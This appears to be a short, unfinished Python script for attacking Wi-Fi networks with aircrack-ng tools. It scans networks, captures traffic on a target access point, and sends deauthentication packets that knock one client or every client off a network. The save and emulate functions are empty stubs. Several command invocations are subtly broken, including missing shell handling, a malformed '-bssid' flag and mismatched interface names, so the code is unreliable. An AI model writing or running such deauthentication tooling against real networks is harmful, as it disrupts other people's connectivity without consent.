#!/.venv/bin/python3
import subprocess as sub



def FindNetworks():
    # using the check_output() for having the network term retrieval 
    devices = sub.check_output("airodump-ng wlan0mon")
    
    return devices
    
def ScanNetwork(network):
    print(f"scanning {network}")
    ipAddress = sub.check_output("arp -a")

    ipAddress = ipAddress.decode('ascii') 
    ipAddress = ipAddress.replace("\r","") 

    ipAddress = ipAddress.split("\n")
    ipAddress = ipAddress[3:]
    return ipAddress

def ScanAccessPoints():
    AP = sub.check_output("airodump-ng wlan0mon")

    return AP


def CapturePackets(channel, bssid):
    pack = sub.check_output(f"airodump-ng -c {channel} -bssid {bssid} wlan0mon")



def Deauth(network, deauthAll=False, numOfAttacks = 1, targetMac = "", accessMac = ""):
    print(f"Deauthing {network}")

    if deauthAll == True:
        #set target to all users on network
        target = ""
    else:
        #syntax for command
        target = " -c" + targetMac
    
    #send deauth packet to network through access point mac address
    sub.run(f"aireplay-ng -0 {numOfAttacks} -a {accessMac}{target} ath0")
    


def SaveNetwork(network):
    print(f"saving {network}")
    #save network data to file of networks saved


def EmulateNetwork(network):
    print(f"emulating {network}")

print(FindNetworks())
